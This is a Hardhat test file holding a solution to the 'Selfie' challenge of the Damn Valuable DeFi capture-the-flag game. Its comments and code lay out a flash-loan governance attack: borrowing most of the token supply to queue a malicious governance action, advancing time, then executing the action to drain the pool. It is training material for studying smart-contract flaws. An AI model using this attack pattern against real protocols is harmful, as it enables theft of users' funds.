const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // Plan
        // 1. Take a flash loan out for more than 50% of available tokens
        // 2. While the flash loan is taken out we queue an action on the 
        //    governance smart contract. The queueAction method on the governance
        //    smart contract checks if the attacker smart contract has more than
        //    50% of the supply to be able to have the power to queueAction
        // 3. Increase the time by 2 days since the governance smart contact has a
        //    "cool down" period of 2 days before queued actions can be executed on
        // 4. Finally execute the action that was queued

        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player))
            .deploy(pool.address, governance.address, token.address);
        await attacker.attack();

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        const action_number = await governance.getActionCounter() - 1;
        await governance.executeAction(action_number);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
